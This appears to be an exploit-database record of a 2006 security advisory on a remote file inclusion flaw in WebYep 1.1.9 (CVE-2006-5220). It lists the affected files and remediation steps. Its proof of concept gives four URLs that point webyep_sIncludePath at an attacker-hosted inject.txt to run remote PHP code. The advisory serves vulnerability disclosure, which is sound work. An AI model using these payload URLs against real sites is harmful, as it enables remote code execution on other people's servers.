{
  "id": "2496",
  "title": "WebYep 1.1.9 - &#039;webyep_sIncludePath&#039; File Inclusion",
  "cve": "CVE-2006-5220",
  "vuln_type": "rce",
  "code": "ECHO_ADV_48$2006\r\n\r\n-----------------------------------------------------------------------------------------------\r\n[ECHO_ADV_48$2006] WebYep <= 1.1.9 (webyep_sIncludePath) Multiple Remote File Inclusion Vulnerability\r\n-----------------------------------------------------------------------------------------------\r\n\r\nAuthor          : Dedi Dwianto a.k.a the_day\r\nDate Found      : October, 05th 2006\r\nLocation        : Indonesia, Jakarta\r\nweb             : http://advisories.echo.or.id/adv/adv48-theday-2006.txt\r\nCritical Lvl    : Highly critical\r\nImpact          : System access\r\nWhere           : From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication     : WebYep\r\nversion         : <=1.1.9\r\nURL             : http://www.obdev.at\r\n\r\nWebYep is a compact Web Content Management System for extremely simple creation of editable\r\nweb pages. It is a low priced alternative for small to medium web sites\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n\r\nIn folder webyep-system/programm/lib found vulnerability script WYApplication.php\r\n---------------------------WYApplication.php---------------------------------------\r\n....\r\n<?\r\n\r\n include_once(\"$webyep_sIncludePath/lib/WYApplication.php\");\r\n include_once(\"$webyep_sIncludePath/lib/WYHTMLTag.php\");\r\n\r\n...\r\n----------------------------------------------------------\r\n\r\nInput passed to the \"$webyep_sIncludePath\" parameter in WYApplication.php is not\r\nproperly verified before being used. This can be exploited to execute\r\narbitrary PHP code by including files from local or external\r\nresources.\r\n\r\nAlso affected files on Files:\r\n\r\nwebyep-system/programm/lib/WYApplication.php\r\nwebyep-system/programm/lib/WYDocument.php\r\nwebyep-system/programm/lib/WYEditor.php\r\nwebyep-system/programm/lib/WYElement.php\r\nwebyep-system/programm/lib/WYFile.php\r\nwebyepasystem/programm/lib/WYHTMLTag.php\r\nwebyep-system/programm/lib/WYImage.php\r\nwebyep-system/programm/lib/WYLanguage.php\r\nwebyep-system/programm/lib/WYLink.php\r\nwebyep-system/programm/lib/WYPath.php\r\nwebyep-system/programm/lib/WYPopupWindowLink.php\r\nwebyep-system/programm/lib/WYSelectMenu.php\r\nwebyep-system/programm/lib/WYTextArea.php\r\nwebyep-system/programm/elements/WYGalleryElement.php\r\nwebyep-system/programm/elements/WYGuestbookElement.php\r\nwebyep-system/programm/elements/WYImageElement.php\r\nwebyep-system/programm/elements/WYLogonButtonElement.php\r\nwebyep-system/programm/elements/WYLongTextElement.php\r\nwebyep-system/programm/elements/WYLoopElement.php\r\nwebyep-system/programm/elements/WYMenuElement.php\r\nwebyep-system/programm/elements/WYShortTextElement.php\r\nwebyep-system/programm/webyep.php\r\n\r\nProof Of Concept:\r\n~~~~~~~~~~~~~~\r\n\r\nhttp://target.com/[webYep_path]/webyep-system/programm/lib/WYApplication.php?webyep_sIncludePath=http://attacker.com/inject.txt?\r\nhttp://target.com/[webYep_path]/webyep-system/programm/lib/WYDocument.php?webyep_sIncludePath=http://attacker.com/inject.txt?\r\nhttp://target.com/[webYep_path]/webyep-system/programm/webyep.php?webyep_sIncludePath=http://attacker.com/inject.txt?\r\nhttp://target.com/[webYep_path]/webyep-system/programm/elements/WYGalleryElement.php?webyep_sIncludePath=http://attacker.com/inject.txt?\r\n\r\nSolution:\r\n~~~~~~\r\n- Sanitize variable $webyep_sIncludePath on affected files.\r\n- Turn off register_globals\r\n\r\nTimeline:\r\n~~~~~~\r\n05 - 10 - 2006 Bugs Found\r\n05 - 10 - 2006 Vendor Contact\r\n09 - 10 - Public Disclosure\r\n\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~\r\n~ y3dips,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous\r\n~ Jessy My Brain\r\n~ az001,boom_3x,mathdule,angelia\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel - #e-c-h-o @irc.dal.net\r\n------------------------------------------------------------------------\r\n---\r\nContact:\r\n~~~\r\n    EcHo Research & Development Center\r\n    the_day[at]echo[dot]or[dot]id\r\n\r\n# milw0rm.com [2006-10-09]",
  "url": "https://www.exploit-db.com/exploits/2496"
}